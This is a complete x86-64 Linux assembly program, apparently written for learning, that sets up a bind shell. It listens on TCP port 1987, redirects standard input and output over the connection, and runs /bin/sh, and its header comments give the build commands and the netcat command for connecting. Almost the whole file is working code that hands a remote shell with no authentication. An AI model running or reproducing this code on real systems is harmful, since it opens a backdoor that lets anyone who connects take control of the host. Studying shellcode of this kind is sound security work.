; bind-linux-x64.asm
; For Linux x64.
;
; Opens a remote /bin/sh on port 1987.
;
; Carlos Reventlov <carlos@reventlov.com>.
; First draft of this program dates back to 2007.
;
; Please see also bind.c.
;
; On the host site:
;
;   $ nasm -g -f elf64 -o bind64.o bind-linux-x64.asm
;   $ ld -m elf_x86_64 -o bind64 bind64.o
;   $ ./bind
;
; On the remote side:
;   $ nc <host> 1987
;
;
; Useful reading:
;   bind-linux-x86.asm
;   /usr/include/asm/unistd_64.h (syscall table)
;   /usr/include/linux/net.h (socketcall constants)
;   /usr/include/bits/socket.h (socket constants)

global _start

section .text

_start:

  ; socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)
  mov rdx, 0x06         ; IPPROTO_TCP
  mov rsi, 0x01         ; SOCK_STREAM
  mov rdi, 0x02         ; PF_INET
  mov rax, 0x29         ; __NR_socket
  syscall

  mov rbx, rax          ; rbx = <sock>

  ; bind(<sock>, <address>, sizeof sockaddr_in)
  mov rdx, 0x10         ; sizeof sockaddr_in
  push byte 0x00        ; INADDR_ANY
  push word [port]      ; 1987
  push word 0x02        ; PF_INET
  mov rsi, rsp
  mov rdi, rbx
  mov rax, 0x31         ; __NR_bind
  syscall

  ; listen(<sock>, 0)
  mov rsi, 0x00
  mov rdi, rbx          ; <sock>
  mov rax, 0x32         ; __NR_listen
  syscall

  ; accept(<sock>, 0, 0)
  mov edx, 0x00
  mov rsi, 0x00
  mov rdi, rbx          ; <sock>
  mov rax, 0x2b         ; __NR_accept
  syscall

  mov rbx, rax          ; rbx = <conn>

  ; dup2(<conn>, STDIN_FILENO)
  mov rsi, 0x00         ; STDIN_FILENO
  mov rdi, rbx          ; <conn>
  mov rax, 0x21         ; __NR_dup2
  syscall

  ; dup2(<conn>, STDOUT_FILENO)
  mov rsi, 0x01         ; STDOUT_FILENO
  mov rdi, rbx          ; <conn>
  mov rax, 0x21         ; __NR_dup2
  syscall

  ; dup2(<conn>, STDERR_FILENO)
  mov rsi, 0x02         ; STDERR_FILENO
  mov rdi, rbx          ; <conn>
  mov rax, 0x21         ; __NR_dup2
  syscall

  ; execve("/bin/sh\0", ["/bin/sh\0"], 0)
  mov rdx, 0x00

  push 0x00
  push qword [shell]
  mov rdi, rsp          ; "/bin/sh\0"

  push 0x00
  push rdi
  mov rsi, rsp          ; ["/bin/sh\0", 0]

  mov rax, 0x3b         ; __NR_execve
  syscall

section .data:
  port: dd 0xc307       ; 1987
  shell: db "/bin/sh"   ; Shell to execute.
